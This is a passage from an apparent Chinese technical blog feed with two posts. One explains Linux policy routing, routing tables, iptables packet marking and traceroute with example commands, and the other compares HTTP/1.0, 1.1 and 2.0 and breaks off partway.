    <content><![CDATA[<h2 id="1-路由"><a href="#1-路由" class="headerlink" title="1. 路由"></a>1. 路由</h2><h3 id="1-1-路由策略（路由规则）"><a href="#1-1-路由策略（路由规则）" class="headerlink" title="1.1 路由策略（路由规则）"></a>1.1 路由策略（路由规则）</h3><p>路由策略具体是指，使用ip rule 命令操作路由策略数据库，基于策略的路由比传统路由在功能上更强大，使用更灵活，它使网络管理员不仅能够根据目的地址，而且能够根据报文大小、应用或IP源地址等属性来选择转发路径。</p>
<p>ip rule 命令：<br>Usage: </p>
<ul>
<li>ip rule [ list | add | del ] SELECTOR ACTION （add 添加；del 删除； llist 列表）</li>
<li>SELECTOR := [ from PREFIX 数据包源地址] [ to PREFIX 数据包目的地址] [ tos TOS 服务类型][ dev STRING 物理接口] [ pref NUMBER ] [fwmark MARK iptables 标签]</li>
<li>ACTION := [ table TABLE_ID 指定所使用的路由表] [ nat ADDRESS 网络地址转换][ prohibit 丢弃该表| reject 拒绝该包| unreachable 丢弃该包]</li>
<li>[ flowid CLASSID ]</li>
<li>TABLE_ID := [ local | main | default | new | NUMBER ]</li>
</ul>
<p>例子：</p>
<ul>
<li>ip rule add from 192.203.80/24 table inr.ruhep prio 220 通过路由表 inr.ruhep 路由来自源地址为192.203.80/24的数据包 </li>
<li>ip rule add from 193.233.7.83 nat 192.203.80.144 table 1 prio 320 把源地址为193.233.7.83的数据报的源地址转换为192.203.80.144，并通过表1进行路由 </li>
</ul>
<p>在 Linux 系统启动时，内核会为路由策略数据库配置三条缺省的规则： </p>
<ol>
<li>0 匹配任何条件 查询路由表local(ID 255,路由表local是一个特殊的路由表，包含对于本地和广播地址的高优先级控制路由)。rule 0非常特殊，不能被删除或者覆盖。  </li>
<li>32766 匹配任何条件 查询路由表main(ID 254,路由表main(ID 254)是一个通常的表，包含所有的无策略路由)。系统管理员可以删除或者使用另外的规则覆盖这条规则。</li>
<li>32767 匹配任何条件 查询路由表default(ID 253, 路由表default(ID 253)是一个空表，它是为一些后续处理保留的)。对于前面的缺省策略没有匹配到的数据包，系统使用这个策略进行处理。这个规则也可以删除。</li>
</ol>
<p>首先我们可以看看路由表默认的所有规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@netmonster# ip rule list</span><br><span class="line"></span><br><span class="line">0: from all lookup local</span><br><span class="line"></span><br><span class="line">32766: from all lookup main</span><br><span class="line"></span><br><span class="line">32767: from all lookup default</span><br></pre></td></tr></table></figure>

<ul>
<li><p>规则0，它是优先级别最高的规则，规则规定，所有的包，都必须首先使用local表（255）进行路由。本规则不能被更改和删除。</p>
</li>
<li><p>规则32766，规定所有的包，使用表main进行路由。本规则可以被更改和删除。</p>
</li>
</ul>
<p>*　规则32767，规定所有的包，使用表default进行路由。本规则可以被更改和删除。</p>
<p>在默认情况下进行路由时，首先会根据规则0在本地路由表里寻找路由，如果目的地址是本网络，或是广播地址的话，在这里就可以找到合适的路由；如果路由失败，就会匹配下一个不空的规则，在这里只有32766规则，在这里将会在主路由表里寻找路由;如果失败，就会匹配32767规则，即寻找默认路由表。如果失败，路由将失败。重这里可以看出，策略性路由是往前兼容的。</p>
<p>另外一种表述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在linux系统中是按照rule的优先级顺序依次匹配。假设系统中只有优先级为0，32766及32767这三条规则。那么系统首先会根据规则0在本地路由表里寻找路由，如果目的地址是本网络，或是广播地址的话，在这里就可以找到匹配的路由；如果没有找到路由，就会匹配下一个不空的规则，在这里只有32766规则，那么将会在主路由表里寻找路由；如果没有找到匹配的路由，就会依据32767规则，即寻找默认路由表；如果失败，路由将失败。</span><br></pre></td></tr></table></figure>



<h3 id="1-2-路由表"><a href="#1-2-路由表" class="headerlink" title="1.2 路由表"></a>1.2 路由表</h3><p>所谓路由表，指的是路由器或者其他互联网网络设备上存储的表，该表中存有到达特定网络终端的路径，在某些情况下，还有一些与这些路径相关的度量。路由器的主要工作就是为经过路由器的每个数据包寻找一条最佳的传输路径，并将该数据有效地传送到目的站点。由此可见，选择最佳路径的策略即路由算法是路由器的关键所在。为了完成这项工作，在路由器中保存着<strong>各种传输路径的相关数据——路由表（Routing Table）</strong>，供路由选择时使用，表中包含的信息决定了数据转发的策略。打个比方，路由表就像我们平时使用的地图一样，标识着各种路线，<strong>路由表中保存着子网的标志信息、网上路由器的个数和下一个路由器的名字等内容</strong>。路由表根据其建立的方法，可以分为动态路由表和静态路由表。</p>
<pre><code>linux 系统中，可以自定义从 1－252个路由表，（实际可以创建 2^32-1个路由表）其中，linux系统维护了4个路由表：</code></pre>
<ul>
<li>0#表： 系统保留表</li>
<li>253#表： defulte table 没特别指定的默认路由都放在该表</li>
<li>254#表： main table 没指明路由表的所有路由放在该表，称为主路由表，表名为main。如果没有指明路由所属的表，所有的路由都默认都放在这个表里。一般来说， 旧的路由工具(如route)所添加的路由都会加到这个表。main表中路由记录都是普通的路由记录。而且，使用ip route配置路由时，如果不明确制定要操作的路由表，默认情况下也是主路由表（表254）进行操作</li>
<li>255#表： locale table 称为本地路由表，表名为local。像本地接口地址，广播地址，以及NAT地址都放在这个表。该路由表由系统自动维护，管理员不能直接修改。</li>
</ul>
<p>路由表的查看可有以下二种方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip route list table table_number</span><br><span class="line">ip route list table table_name</span><br></pre></td></tr></table></figure>

<p>路由表序号和表名的对应关系在 /etc/iproute2/rt_tables 文件中，可手动编辑。路由表添加完毕即时生效，下面为实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip route add default via 192.168.1.1 table 1  #在一号表中添加默认路由为192.168.1.1</span><br><span class="line">ip route add 192.168.0.0&#x2F;24 via 192.168.1.2 table 1  #在一号表中添加一条到192.168.0.0网段的路由为192.168.1.2</span><br></pre></td></tr></table></figure>

<p>路由表实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Destination    Netmask    Gateway          Interface    Metric</span><br><span class="line">0.0.0.0    0.0.0.0    192.168.123.254    192.168.123.88    1 #缺省路由，目的地址不在本路由表中的数据包，经过本机的 192.168.123.88 接口发到下一个路由器 192.168.123.254</span><br><span class="line">127.0.0.0    255.0.0.0    127.0.0.1    127.0.0.1    1        #发给本机的网络包</span><br><span class="line">192.168.123.0    255.255.255.0    192.168.123.68    192.168.123.68    1 #直连路由。目的地址为 192.168.123.0&#x2F;24 的包发到本机 192.168.123.88 接口</span><br><span class="line">192.168.123.88    255.255.255.255    127.0.0.1    127.0.0.1    1        #目的地址为 192.168.123.88的包是发给本机的包</span><br><span class="line">192.168.123.255    255.255.255.255    192.168.123.88    192.168.123.88    1 #广播包的网段是 192.168.123.0&#x2F;24，经过 192.168.123.88 接口发出去</span><br><span class="line">224.0.0.0    224.0.0.0    192.168.123.88    192.168.123.88    1             #多播包，经过 192.168.123.88 接口发出去</span><br><span class="line">255.255.255.255    255.255.255.255    192.168.123.68    192.168.123.68    1 #全网广播包</span><br><span class="line">Default Gateway: 192.168.123.254</span><br></pre></td></tr></table></figure>

<p>字段说明</p>
<ul>
<li>destination：目的网段</li>
<li>mask：与网络目标地址相关联的网掩码（又称之为子网掩码）。子网掩码对于 IP 网络地址可以是一适当的子网掩码，对于主机路由是 255.255.255.255 ，对于默认路由是 0.0.0.0。如果忽略，则使用子网掩码 255.255.255.255。定义路由时由于目标地址和子网掩码之间的关系，目标地址不能比它对应的子网掩码更为详细。换句话说，如果子网掩码的一位是 0，则目标地址中的对应位就不能设置为 1。</li>
<li>interface：到达该目的地的本路由器的出口ip</li>
<li>gateway： 下一跳路由器入口的 ip，路由器通过 interface 和 gateway 定义一调到下一个路由器的链路。通常情况下，interface 和 gateway 是同一网段的metric 跳数，该条路由记录的质量，一般情况下，如果有多条到达相同目的地的路由记录，路由器会采用metric值小的那条路由</li>
</ul>
<p>根据子网掩码，可以将路由分为三种类型：</p>
<p>主机路由：主机路由是路由选择表中指向单个IP地址或主机名的路由记录。主机路由的Flags字段为H。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Destination    Gateway       Genmask        Flags     Metric    Ref    Use    Iface</span><br><span class="line">-----------    -------     -------            -----     ------    ---    ---    -----</span><br><span class="line">10.0.0.10     192.168.1.1    255.255.255.255   UH       0        0      0    eth0</span><br></pre></td></tr></table></figure>
<p>网络路由：网络路由是代表主机可以到达的网络。网络路由的Flags字段为N。例如，在下面的示例中，本地主机将发送到网络192.19.12的数据包转发到IP地址为192.168.1.1的路由器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Destination    Gateway       Genmask      Flags    Metric    Ref     Use    Iface</span><br><span class="line">-----------    -------     -------         -----    -----   ---    ---    -----</span><br><span class="line">192.19.12     192.168.1.1    255.255.255.0      UN      0       0     0    eth0</span><br></pre></td></tr></table></figure>

<p>默认路由：当主机不能在路由表中查找到目标主机的IP地址或网络路由时，数据包就被发送到默认路由（默认网关）上。默认路由的Flags字段为G。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Destination    Gateway       Genmask    Flags     Metric    Ref    Use    Iface</span><br><span class="line">-----------    -------     ------- -----      ------    ---    ---    -----</span><br><span class="line">default       192.168.1.1     0.0.0.0    UG       0        0     0    eth0</span><br></pre></td></tr></table></figure>

<p>设置和查看路由表都可以用 route 命令，设置内核路由表的命令格式是：</p>
<p>route [add|del] [-net|-host] target [netmask Nm] [gw Gw] [[dev] If]</p>
<p>其中：</p>
<p>add : 添加一条路由规则，</p>
<p>del : 删除一条路由规则，</p>
<p>-net : 目的地址是一个网络，</p>
<p>-host : 目的地址是一个主机，</p>
<p>target : 目的网络或主机</p>
<p>netmask : 目的地址的网络掩码，</p>
<p>gw : 路由数据包通过的网关，</p>
<p>dev : 为路由指定的网络接口<br>比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route add 0.0.0.0 mask 0.0.0.0 192.168.12.1</span><br><span class="line">route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 metric 7</span><br></pre></td></tr></table></figure>
<p>优先级别越高的规则越先匹配（数值越小优先级别越高）</p>
<p>关于 src 属性：</p>
<p>当一个主机有多个网卡配置了多个 IP 的时候，对于它产生的网络包，可以在路由选择时<strong>设置源 IP 地址</strong>。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip route add 78.22.45.0&#x2F;24 via 10.45.22.1 src 10.45.22.12 （##发到 78.22.45.0&#x2F;24 网段的网络包，下一跳的路由器 IP 是 10.45.22.1，包的源IP地址设为10.45.22.12）。</span><br></pre></td></tr></table></figure>

<p>要注意的是，src 选项只会影响该 host 上产生的网络包。如果是一个被路由的外来包，明显地它已经带有了一个源 IP 地址，这时候，src 参数的配置对它没有任何影响，除非你使用 NAT 来改变它。对 Neutron 来说，qrouter 和 qif namespace 中的路由表中的 src 都没有实际意义，因为它们只会处理外来的网络包。</p>
<h3 id="1-3-路由表和策略的区别"><a href="#1-3-路由表和策略的区别" class="headerlink" title="1.3 路由表和策略的区别"></a>1.3 路由表和策略的区别</h3><p>不要混淆路由表和策略：规则指向路由表，多个规则可以引用一个路由表，而且某些路由表可以没有策略指向它。如果系统管理员删除了指向某个路由表的所有规则，这个表就没有用了，但是仍然存在，直到里面的所有路由都被删除，它才会消失。</p>
<p>结合前面讲的路由表和路由策略来进行分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@netmonster# ip rule list</span><br><span class="line"></span><br><span class="line">0: from all lookup local</span><br><span class="line"></span><br><span class="line">32766: from all lookup main</span><br><span class="line"></span><br><span class="line">32767: from all lookup default</span><br></pre></td></tr></table></figure>
<p>首先所有的数据包都会选择规则0，它是优先级别最高的规则，规则规定，所有的包，都必须首先使用local表（255）进行路由。本规则不能被更改和删除，这里我们查看254 表的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="1-4-路由分类-静态路由"><a href="#1-4-路由分类-静态路由" class="headerlink" title="1.4 路由分类-静态路由"></a>1.4 路由分类-静态路由</h3><p>静态路由是指由用户或网络管理员手工配置的路由信息。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。静态路由信息在缺省情况下是私有的，不会传递给其他的路由器。当然，网管员也可以通过对路由器进行设置使之成为共享的。静态路由一般适用于比较简单的网络环境，在这样的环境中，网络管理员易于清楚地了解网络的拓扑结构，便于设置正确的路由信息。<br><img src="/2021/12/14/iptables-route-%E5%85%B3%E7%B3%BB/1.png" alt="avatar"></p>
<p>以上面的拓扑结构为例，在没有配置路由的情况下，计算机1 和 2 无法互相通信，因为 1 发给 2 的包在到达路由器 A 后，它不知道怎么转发它。B 也同样。管理员可以配置如下的静态路由来实现 1 和 2 之间的通信：</p>
<p>计算机配置默认网关：</p>
<p>计算机1 上：route add default gw 192.168.1.1</p>
<p>计算机2 上：route add default gw 192.168.3.1</p>
<p>路由器配置：</p>
<p>R1 上：ip route 192.168.3.0 255.255.255.0 f0/1 （意思为：目标网络地址为 192.168.3.0/24 的数据包，经过 f0/1 端口发出）</p>
<p>R2 上：ip route 192.168.1.0 255.255.255.0 f0/1 （意思为：目标网络地址为 192.168.1.0/24 的数据包，经过 f0/1 端口发出）</p>
<p>或者</p>
<p>R1 上：ip route 192.168.3.0 255.255.255.0 192.168.2.2 （意思为：要去 192.168.3.0/24 的数据包，下一路由器 IP 地址为 192.168.2.2）</p>
<p>R2 上：ip route 192.168.1.0 255.255.255.0 192.168.2.1</p>
<h3 id="1-5-路由分类-动态路由"><a href="#1-5-路由分类-动态路由" class="headerlink" title="1.5 路由分类-动态路由"></a>1.5 路由分类-动态路由</h3><p>动态路由是指路由器能够自动地建立自己的路由表，并且能够根据实际情况的变化适时地进行调整。它是与静态路由相对的一个概念，指路由器能够根据路由器之间的交换的特定路由信息自动地建立自己的路由表，并且能够根据链路和节点的变化适时地进行自动调整。当网络中节点或节点间的链路发生故障，或存在其它可用路由时，动态路由可以自行选择最佳的可用路由并继续转发报文。</p>
<p>常见的动态路由协议有以下几个：路由信息协议（RIP）、OSPF(Open Shortest Path First开放式最短路径优先）、IS-IS（Intermediate System-to-Intermediate System，中间系统到中间系统）、边界网关协议（BGP）是运行于 TCP 上的一种自治系统的路由协议。</p>
<h3 id="1-6-ip-rule，ip-route，iptables-三者之间的关系"><a href="#1-6-ip-rule，ip-route，iptables-三者之间的关系" class="headerlink" title="1.6  ip rule，ip route，iptables 三者之间的关系"></a>1.6  ip rule，ip route，iptables 三者之间的关系</h3><p>以一例子来说明：公司内网要求192.168.0.100 以内的使用 10.0.0.1 网关上网 （电信），其他IP使用 20.0.0.1 （网通）上网。</p>
<ol>
<li>首先要在网关服务器上添加一个默认路由，当然这个指向是绝大多数的IP的出口网关：ip route add default gw 20.0.0.1</li>
<li>之后通过 ip route 添加一个路由表：ip route add table 3 via 10.0.0.1 dev ethX (ethx 是 10.0.0.1 所在的网卡, 3 是路由表的编号)</li>
<li>之后添加 ip rule 规则：ip rule add fwmark 3 table 3 （fwmark 3 是标记，table 3 是路由表3 上边。 意思就是凡事标记了 3 的数据使用 table3 路由表）</li>
<li>之后使用 iptables 给相应的数据打上标记：iptables -A PREROUTING -t mangle -i eth0 -s 192.168.0.1 - 192.168.0.100 -j MARK –set-mark 3（因为 mangle 的处理是优先于 nat 和 fiter 表的，所以在数据包到达之后先打上标记，之后再通过 ip rule 规则，对应的数据包使用相应的路由表进行路由，最后读取路由表信息，将数据包送出网关。）</li>
</ol>
<h3 id="1-7-Traceroute-工具"><a href="#1-7-Traceroute-工具" class="headerlink" title="1.7 Traceroute 工具"></a>1.7 Traceroute 工具</h3><p>我们在 linux 机器上，使用 traceroute 来获知从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。在 MS Windows 中该工具为 tracert。 在大多数情况下，<br>我们会在linux主机系统下，直接执行命令行：traceroute hostname；</p>
<p>而在Windows系统下是执行tracert的命令： tracert hostname。</p>
<ul>
<li>命令格式：traceroute [参数] [主机]</li>
<li>命令功能：traceroute 指令让你追踪网络数据包的路由途径，预设数据包大小是 40Bytes，用户可另行设置。</li>
<li>具体参数格式：traceroute [-dFlnrvx][-f&lt;存活数值&gt;][-g&lt;网关&gt;…][-i&lt;网络界面&gt;][-m&lt;存活数值&gt;][-p&lt;通信端口&gt;][-s&lt;来源地址&gt;][-t&lt;服务类型&gt;][-w&lt;超时秒数&gt;][主机名称或IP地址][数据包大小]</li>
</ul>
<p>命令参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> -d 使用Socket层级的排错功能，</span><br><span class="line"> -f 设置第一个检测数据包的存活数值TTL的大小，</span><br><span class="line"> -F 设置勿离断位，</span><br><span class="line"> -g 设置来源路由网关，最多可设置8个，</span><br><span class="line"> -i 使用指定的网络界面送出数据包，</span><br><span class="line"> -I 使用ICMP回应取代UDP资料信息，</span><br><span class="line"> -m 设置检测数据包的最大存活数值TTL的大小，</span><br><span class="line"> -n 直接使用IP地址而非主机名称。</span><br><span class="line"> -p 设置UDP传输协议的通信端口，</span><br><span class="line"> -r 忽略普通的Routing Table，直接将数据包送到远端主机上，</span><br><span class="line"> -s 设置本地主机送出数据包的IP地址，</span><br><span class="line"> -t 设置检测数据包的TOS数值。</span><br><span class="line"> -v 详细显示指令的执行过程，</span><br><span class="line"> -w 设置等待远端主机回报的时间，</span><br><span class="line"> -x 开启或关闭数据包的正确性检验。</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure>

<p>（1）例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# traceroute www.baidu.com</span><br><span class="line">traceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets</span><br><span class="line">1 192.168.74.2 (192.168.74.2) 2.606 ms 2.771 ms 2.950 ms</span><br><span class="line">2 211.151.56.57 (211.151.56.57) 0.596 ms 0.598 ms 0.591 ms</span><br><span class="line">3 211.151.227.206 (211.151.227.206) 0.546 ms 0.544 ms 0.538 ms</span><br><span class="line">4 210.77.139.145 (210.77.139.145) 0.710 ms 0.748 ms 0.801 ms</span><br><span class="line">5 202.106.42.101 (202.106.42.101) 6.759 ms 6.945 ms 7.107 ms</span><br><span class="line">6 61.148.154.97 (61.148.154.97) 718.908 ms * bt-228-025.bta.net.cn (202.106.228.25) 5.177 ms</span><br><span class="line">7 124.65.58.213 (124.65.58.213) 4.343 ms 4.336 ms 4.367 ms</span><br><span class="line">8 202.106.35.190 (202.106.35.190) 1.795 ms 61.148.156.138 (61.148.156.138) 1.899 ms 1.951 ms</span><br><span class="line">9 * * *</span><br><span class="line">30 * * *</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<p>记录按序列号从1开始，每个纪录就是一跳 ，每跳表示一个网关，我们看到每行有三个时间，单位是 ms，其实就是 -q 的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果您用 traceroute -q 4 <a href="http://www.58.com/" target="_blank" rel="noopener">www.58.com</a> ，表示向每个网关发送4个数据包。有时我们 traceroute 一台主机时，会看到有一些行是以星号表示的。出现这样的情况，可能是防火墙封掉了ICMP 的返回信息，所以我们得不到什么相关的数据包返回数据。有时我们在某一网关处延时比较长，有可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台 DNS 出现问题时，不能解析主机名、域名时，也会 有延时长的现象；您可以加-n 参数来避免DNS解析，以IP格式输出数据。</p>
<p>如果在局域网中的不同网段之间，我们可以通过 traceroute 来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute 追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。</p>
<p>（2）原理</p>
<p> Traceroute 程序的设计是利用 ICMP 及 IP header 的 TTL（Time To Live）栏位（field）。</p>
<ul>
<li>首先，traceroute 送出一个 TTL 是 1 的 IP datagram（其实，每次送出的为3个40字节的包，包括源地址，目的地址和包发出的时间标签）到目的地，当路径上的第一个路由器（router）收到这个datagram 时，它将TTL减1。此时，TTL变为0了，所以该路由器会将此 datagram 丢掉，并送回一个「ICMP time exceeded」消息（包括发IP包的源地址，IP包的所有内容及路由器的IP地址），traceroute 收到这个消息后，便知道这个路由器存在于这个路径上。</li>
<li>接着，traceroute 再送出另一个TTL 是 2  的datagram，发现第2 个路由器…… </li>
<li>然后，traceroute  每次将送出的 datagram 的 TTL  加1来发现另一个路由器，这个重复的动作一直持续到某个datagram 抵达目的地。当datagram到达目的地后，该主机并不会送回ICMP time exceeded消息，因为它已是目的地了，那么traceroute如何得知目的地到达了呢？</li>
</ul>
<p>Traceroute 在送出 UDP datagrams 到目的地时，它所选择送达的 port number 是一个一般应用程序都不会用的号码（30000 以上），所以当此 UDP datagram 到达目的地后该主机会送回一个「ICMP port unreachable」的消息，而当traceroute 收到这个消息时，便知道目的地已经到达了。所以traceroute 在Server端也是没有所谓的Daemon 程式。Traceroute提取发 ICMP TTL 到期消息设备的 IP 地址并作域名解析。每次 ，Traceroute 都打印出一系列数据,包括所经过的路由设备的域名及 IP地址,三个包每次来回所花时间。</p>
<p>参考文章 <a href="https://www.cnblogs.com/EasonJim/p/8424731.html" target="_blank" rel="noopener">https://www.cnblogs.com/EasonJim/p/8424731.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>http1.0 http1.1与http2.0的区别</title>
    <url>/2021/03/30/http1-0-http1-1%E4%B8%8Ehttp2-0%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h2 id="最重要的区别"><a href="#最重要的区别" class="headerlink" title="最重要的区别"></a>最重要的区别</h2><ol>
<li>从HTTP/1.0到HTTP/2，都是利用TCP作为底层协议进行通信的。</li>
<li>HTTP/1.1，引进了长连接(keep-alive)，减少了建立和关闭连接的消耗和延迟。</li>
<li>HTTP/2，引入了多路复用：连接共享，提高了连接的利用率，降低延迟。</li>
</ol>
<p>在Chrome浏览器里，打开chrome://net-internals/#http2，可以看到http2链接的信息</p>
<h2 id="HTTP的基本优化"><a href="#HTTP的基本优化" class="headerlink" title="HTTP的基本优化"></a>HTTP的基本优化</h2><p>影响一个 HTTP 网络请求的因素主要有两个：带宽和延迟。</p>
<ol>
<li><p>带宽，如果说我们还停留在拨号上网的阶段，带宽可能会成为一个比较严重影响请求的问题，但是现在网络基础建设已经使得带宽得到极大的提升，我们不再会担心由带宽而影响网速，那么就只剩下延迟了。</p>
</li>
<li><p>延迟，</p>
<p> 2.1 浏览器阻塞（HOL blocking）：浏览器会因为一些原因阻塞请求。浏览器对于同一个域名，同时只能有 4 个连接（这个根据浏览器内核不同可能会有所差异），超过浏览器最大连接数限制，后续请求就会被阻塞。</p>
<p> 2.2 DNS 查询（DNS Lookup）：浏览器需要知道目标服务器的 IP 才能建立连接。将域名解析为 IP 的这个系统就是 DNS。这个通常可以利用DNS缓存结果来达到减少这个时间的目的。</p>
<p> 2.3 建立连接（Initial connection）：HTTP 是基于 TCP 协议的，浏览器最快也要在第三次握手时才能捎带 HTTP 请求报文，达到真正的建立连接，但是这些连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。</p>
<h2 id="HTTP1-0和HTTP1-1的一些区别"><a href="#HTTP1-0和HTTP1-1的一些区别" class="headerlink" title="HTTP1.0和HTTP1.1的一些区别"></a>HTTP1.0和HTTP1.1的一些区别</h2><p>HTTP1.0最早在网页中使用是在1996年，那个时候只是使用一些较为简单的网页上和网络请求上，而HTTP1.1则在1999年才开始广泛应用于现在的各大浏览器网络请求中，同时HTTP1.1也是当前使用最为广泛的HTTP协议。 主要区别主要体现在：</p>
</li>
<li><p>缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。</p>
</li>
<li><p>带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p>
</li>
<li><p>错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
</li>
<li><p>Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。</p>
</li>
<li><p>长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</p>
</li>
</ol>
<h2 id="HTTP-2-0-和-HTTP1-1-区别"><a href="#HTTP-2-0-和-HTTP1-1-区别" class="headerlink" title="HTTP 2.0 和 HTTP1.1 区别"></a>HTTP 2.0 和 HTTP1.1 区别</h2><p>HTTP 2.0 的出现，相比于 HTTP 1.x ，大幅度的提升了 web 性能。在与 HTTP/1.1 完全语义兼容的基础上，进一步减少了网络延迟。Akamai 公司建立的一个官方的演示，用以说明 HTTP/2 相比于之前的 HTTP/1.1 在性能上的大幅度提升。 同时请求 379 张图片，从Load time 的对比可以看出 HTTP/2 在速度上的优势。<br>  <img src="http1-0-http1-1%E4%B8%8Ehttp2-0%E7%9A%84%E5%8C%BA%E5%88%AB/1.png" alt="avatar"></p>
<h3 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h3><p>多路复用允许单一的HTTP2连接同时发起多重的请求-响应消息，每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。如下所示</p>
<p><img src="http1-0-http1-1%E4%B8%8Ehttp2-0%E7%9A%84%E5%8C%BA%E5%88%AB/2.png" alt="avatar"></p>
<p>整个访问流程第一次请求index.html页面,之后浏览器会去请求style.css和scripts.js的文件。左边的图是顺序加载两个个文件的，右边则是并行加载两个文件。</p>
<p>我们知道HTTP底层其实依赖的是TCP协议，那问题是在同一个连接里面同时发生两个请求响应着是怎么做到的？</p>
<p>首先你要知道，TCP连接相当于两根管道（一个用于服务器到客户端，一个用于客户端到服务器），管道里面数据传输是通过字节码传输，传输是有序的，每个字节都是一个一个来传输。</p>
<p>例如客户端要向服务器发送Hello、World两个单词，只能是先发送Hello再发送World，没办法同时发送这两个单词。不然服务器收到的可能就是HWeolrllod（注意是穿插着发过去了，但是顺序还是不会乱）。这样服务器就懵b了。</p>
<p>接上面的问题，能否同时发送Hello和World两个单词能，当然也是可以的，可以将数据拆成包，给每个包打上标签。发的时候是这样的①H ②W ①e ②o ①l ②r ①l ②l ①o ②d。这样到了服务器，服务器根据标签把两个单词区分开来。HTTP/2 可以很容易的去实现多流并行而不用依赖建立多个 TCP 连接，HTTP/2 把 HTTP 协议通信的基本单位缩小为一个一个的帧，这些帧对应着逻辑流中的消息。并行地在同一个 TCP 连接上双向交换消息。如何做到这一点呢，主要是http2 引入了二进制分帧，在不改动http1.x的语义、方法、状态码、URI以及首部字段等的情况下，关键就是在应用层http2.0和传输层tcp/udp之间增加一个二进制分帧层</p>
<p><img src="http1-0-http1-1%E4%B8%8Ehttp2-0%E7%9A%84%E5%8C%BA%E5%88%AB/3.png" alt="avatar"></p>
<p>在二进制分帧层中， HTTP/2 会将所有传输的信息分割为更小的消息和帧（frame）,并对它们采用二进制格式的编码 ，其中 HTTP1.x 的首部信息会被封装到 HEADER frame，而相应的 Request Body 则封装到 DATA frame 里面。 HTTP/2 通信都在一个连接上完成，这个连接可以承载任意数量的双向数据流。 在过去， HTTP 性能优化的关键并不在于高带宽，而是低延迟。TCP 连接会随着时间进行自我「调谐」，起初会限制连接的最大速度，如果数据成功传输，会随着时间的推移提高传输的速度。这种调谐则被称为 TCP 慢启动。由于这种原因，让原本就具有突发性和短时性的 HTTP 连接变的十分低效。</p>
<p><img src="http1-0-http1-1%E4%B8%8Ehttp2-0%E7%9A%84%E5%8C%BA%E5%88%AB/4.png" alt="avatar"></p>
<h3 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h3><p>在 HTTP/1 中，HTTP 请求和响应都是由「状态行、请求 / 响应头部、消息主体」三部分组成。一般而言，消息主体都会经过 gzip 压缩，或者本身传输的就是压缩过后的二进制文件（例如图片、音频），但状态行和头部却没有经过任何压缩，直接以纯文本传输。随着 Web 功能越来越复杂，每个页面产生的请求数也越来越多，导致消耗在头部的流量越来越多，尤其是每次都要传输 UserAgent、Cookie 这类不会频繁变动的内容，完全是一种浪费。</p>
